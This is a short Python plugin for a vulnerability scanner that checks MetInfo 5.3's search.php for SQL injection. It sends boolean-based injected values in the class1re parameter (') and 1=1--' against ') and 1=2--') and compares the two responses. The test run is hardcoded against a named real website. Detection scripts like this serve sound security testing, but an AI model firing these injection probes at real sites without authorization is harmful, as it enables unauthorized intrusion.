#!/usr/bin/env python
# -*- coding: utf-8 -*-
# __Author__ = p4ny
# __Service_ = metinfo
# __Refer___ = http://www.wooyun.org/bugs/wooyun-2015-0106582
# ___Type___ = SQL注入
'''
MetInfo5.3 search.php SQL注射
'''
import re
def assign(service, arg):
    if service == "metinfo":
        return True, arg

def audit(url):
    true_url = url + "search/search.php?class1=2&class2=&class3=&searchtype=2&searchword=testvul&lang=cn&class1re=)%20and%201=1--%20sd"
    false_url = url + "search/search.php?class1=2&class2=&class3=&searchtype=2&searchword=testvul&lang=cn&class1re=)%20and%201=2--%20sd"

    code1, head1, res1, errcode1, _ = curl.curl2(true_url)
    code2, head2, res2, errcode2, _ = curl.curl2(false_url)
    
    m1=re.findall("<li><span class='search_title'>", res1)
    m2=re.findall("<li><span class='search_title'>", res2)
    if code2==200 and code1==200 and len(m1)!=len(m2):
        security_hole(true_url)

if __name__ == '__main__':
    from dummy import *

    audit(assign('metinfo', 'http://www.ismartcity.com.cn/')[1])